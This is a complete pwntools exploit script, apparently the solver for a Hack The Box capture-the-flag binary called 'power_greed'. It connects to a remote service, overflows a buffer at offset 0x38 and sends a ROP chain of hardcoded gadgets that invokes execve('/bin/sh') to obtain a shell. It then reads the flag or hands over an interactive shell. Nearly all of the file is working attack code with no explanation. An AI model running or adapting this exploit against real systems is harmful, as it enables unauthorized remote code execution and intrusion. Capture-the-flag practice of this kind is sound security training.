#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
context.log_level = 'critical'

fname = './power_greed' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

sla = lambda x,y : r.sendlineafter(x,y)

def get_flag():
  pause(1)
  r.sendline('cat flag* 2>/dev/null')
  flag = r.recvline_contains(b"HTB", timeout=0.2).strip().decode()
  if len(flag) == 0:
    print('\n~~ Shell ~~\n')
    r.interactive()
  else:
    print(f'\nFlag --> {flag}\n')

for _ in range(2): sla('> ', '1')

pop_rax_ret = 0x000000000042adab
pop_rdi_pop_rbp_ret = 0x0000000000402bd8
pop_rsi_pop_rbp_ret = 0x000000000040c002 
bin_sh = 0x481778
pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0x000000000046f4dc
syscall = 0x000000000040141a 

'''
rax |            |          rdi         |           rsi            |          rdx
59  | sys_execve | const char *filename | const char *const argv[] | const char *const envp[]
'''

payload = flat({ 
  0x38: p64(pop_rdi_pop_rbp_ret) + p64(bin_sh) + p64(0) + 
        p64(pop_rsi_pop_rbp_ret) + p64(0)*2 +
        p64(pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret) + p64(0)*5 +
        p64(pop_rax_ret) + p64(0x3b) +
        p64(syscall)
})

sla(': ', 'y')

sla('buffer: ', payload)

get_flag()
